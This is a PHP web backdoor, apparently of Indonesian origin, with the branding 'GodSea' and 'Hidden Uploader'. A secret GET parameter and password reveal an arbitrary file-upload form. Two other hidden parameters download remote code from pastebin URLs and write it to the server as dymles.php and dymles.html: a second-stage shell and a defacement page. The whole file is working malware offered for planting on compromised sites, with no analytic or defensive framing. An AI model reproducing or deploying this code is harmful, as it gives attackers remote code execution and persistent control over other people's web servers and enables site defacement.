<?php
// hidden shell upload
// akses file.php?shell
 error_reporting(0);
 $cmd  = $_GET['hanna'];
 $post  = $_POST["upload"];
 $target_file= basename($_FILES["m_upload"]["name"]);
 if($cmd=='sayang')
 {
?>
<html>
<head>
<title>GodSea</title>
<meta name='author' content='0x1999'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	background: #202020;
	color: lime;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
</style>
<center>
<header>   
	<font color=lime><b><h1>Hidden Uploader</b></h1>
	<br><br>
		<img src="http://hackerfactor.com/images/neal-stick2.png">
		</header>
<?php
  echo "<form action='' method='post' enctype='multipart/form-data'>
";
  echo "<input type='file' name='m_upload'>";
  echo "<input type='submit' name='upload' value='Upload'>";
  echo "</form>
";
  echo "</center>
";
 }
 
 if(isset($_POST["upload"]))
  {
   if(move_uploaded_file($_FILES["m_upload"]["tmp_name"], $target_file))
  {
   echo "<center>
Gotcha !!!</center>
";
   header("location:$target_file");
 }
}


if(isset($_GET["darkskull7"])){
$anak1 = file_get_contents("https://pastebin.com/raw/uv2iBjc4");
$nggawe1 = fopen("dymles.php","w") or die ("gabisa bro");
fwrite($nggawe1,$anak1);
fclose($nggawe1);
header ("Location:dymles.php");
chmod("dymles.php",0644);}
//////////////////////////////
if(isset($_GET["deface"])){
$anak = file_get_contents("https://pastebin.com/raw/u0w0wBQx");
$nggawe = fopen("dymles.html","w") or die ("gabisa bro");
fwrite($nggawe,$anak);
fclose($nggawe);
header ("Location:dymles.html");}
?>